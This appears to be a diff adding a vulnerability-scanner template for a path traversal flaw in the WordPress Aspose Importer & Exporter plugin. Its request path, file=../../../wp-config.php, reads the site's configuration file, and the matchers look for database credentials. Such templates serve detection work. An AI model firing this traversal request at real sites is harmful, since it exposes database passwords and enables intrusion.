@@ -1,0 +1,26 @@
+id: aspose-ie-file-download
+info:
+  author: 0x_Akoko
+  description: The Aspose importer and Exporter WordPress plugin is affected by an
+    arbitrary file retrieval vulnerability.
+  name: Wordpress Aspose Importer & Exporter v1.0 - Arbitrary File Retrieval
+  reference:
+  - https://packetstormsecurity.com/files/131162/
+  - https://wordpress.org/plugins/aspose-importer-exporter
+  severity: high
+  tags: wordpress,wp-plugin,lfi,aspose
+requests:
+- matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - DB_NAME
+    - DB_PASSWORD
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/wp-content/plugins/aspose-importer-exporter/aspose_import_export_download?file=../../../wp-config.php'
